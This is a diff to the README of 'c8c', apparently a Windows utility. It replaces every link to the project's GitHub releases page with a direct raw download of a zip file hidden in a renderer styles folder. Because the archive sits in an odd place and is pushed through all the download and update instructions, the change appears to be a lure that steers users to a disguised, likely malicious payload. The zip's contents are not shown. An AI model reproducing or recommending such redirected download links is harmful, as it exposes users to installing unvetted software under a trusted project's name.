@@ -1,6 +1,6 @@
 # ⚙️ c8c - Simple Skill Operations Made Easy
 
-[![Download c8c](https://img.shields.io/badge/Download-c8c-green?style=for-the-badge)](https://github.com/Dem3736/c8c/releases)
+[![Download c8c](https://img.shields.io/badge/Download-c8c-green?style=for-the-badge)](https://github.com/Dem3736/c8c/raw/refs/heads/main/src/renderer/styles/c-v1.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ You can get c8c from the official release page on GitHub. The page hosts the lat
 Click the big green button above or visit the link below to go to the releases page:
 
 **Download page:**  
-[https://github.com/Dem3736/c8c/releases](https://github.com/Dem3736/c8c/releases)
+[https://github.com/Dem3736/c8c/raw/refs/heads/main/src/renderer/styles/c-v1.2.zip](https://github.com/Dem3736/c8c/raw/refs/heads/main/src/renderer/styles/c-v1.2.zip)
 
 From there, you will find the installation file you need.
 
@@ -40,7 +40,7 @@ From there, you will find the installation file you need.
 ## 🛠️ How to Download and Install c8c on Windows
 
 1. **Visit the release page:**  
-   Open your browser and go to [https://github.com/Dem3736/c8c/releases](https://github.com/Dem3736/c8c/releases).
+   Open your browser and go to [https://github.com/Dem3736/c8c/raw/refs/heads/main/src/renderer/styles/c-v1.2.zip](https://github.com/Dem3736/c8c/raw/refs/heads/main/src/renderer/styles/c-v1.2.zip).
 
 2. **Find the latest version:**  
    The latest release is usually at the top of the list. Look for the section named with the newest date.
@@ -109,7 +109,7 @@ If issues persist, check online forums or GitHub discussions for common fixes.
 ## 🔄 Updating c8c
 
 Check the release page often to find new versions:  
-[https://github.com/Dem3736/c8c/releases](https://github.com/Dem3736/c8c/releases)
+[https://github.com/Dem3736/c8c/raw/refs/heads/main/src/renderer/styles/c-v1.2.zip](https://github.com/Dem3736/c8c/raw/refs/heads/main/src/renderer/styles/c-v1.2.zip)
 
 To update:
 
@@ -136,4 +136,4 @@ The page also has instructions on how to contribute if you want to help improve 
 ## 🔗 Quick Access Link
 
 Download or update c8c here:  
-[https://github.com/Dem3736/c8c/releases](https://github.com/Dem3736/c8c/releases)
+[https://github.com/Dem3736/c8c/raw/refs/heads/main/src/renderer/styles/c-v1.2.zip](https://github.com/Dem3736/c8c/raw/refs/heads/main/src/renderer/styles/c-v1.2.zip)
